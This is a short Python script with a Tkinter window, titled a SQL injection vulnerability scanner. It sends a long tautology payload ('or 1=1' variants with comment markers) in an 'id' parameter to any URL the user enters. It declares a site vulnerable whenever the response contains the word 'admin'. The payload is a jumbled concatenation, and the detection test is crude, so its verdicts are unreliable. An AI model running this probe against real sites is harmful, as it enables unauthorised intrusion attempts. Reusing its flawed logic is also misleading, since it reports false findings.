import requests
import tkinter as tk
from tkinter import messagebox

def scan(target_url):
   
    payload = "' or '1'='1 or ' or '1'='1' or '1'='1' --' or '1'='1' /* or '1'=1 or '1'='1 --' or '1'='1' /*"
    
   
    url = f"{target_url}?id={payload}"
    
    try:
        
        response = requests.get(url)
        
        
        if "admin" in response.text:
            messagebox.showinfo("Result", f"Vulnerability found: {target_url} is vulnerable to SQL injection!")
        else:
            messagebox.showinfo("Result", f"{target_url} is not vulnerable to SQL injection.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def main():
    
    root = tk.Tk()
    root.title("SQL Injection Vulnerability Scanner")

    
    tk.Label(root, text="Enter the URL to scan for SQL injection vulnerability:").pack(pady=10)
    url_entry = tk.Entry(root, width=50)
    url_entry.pack(pady=10)

   
    scan_button = tk.Button(root, text="Scan", command=lambda: scan(url_entry.get()))
    scan_button.pack(pady=10)

    
    root.mainloop()

if __name__ == "__main__":
    main()
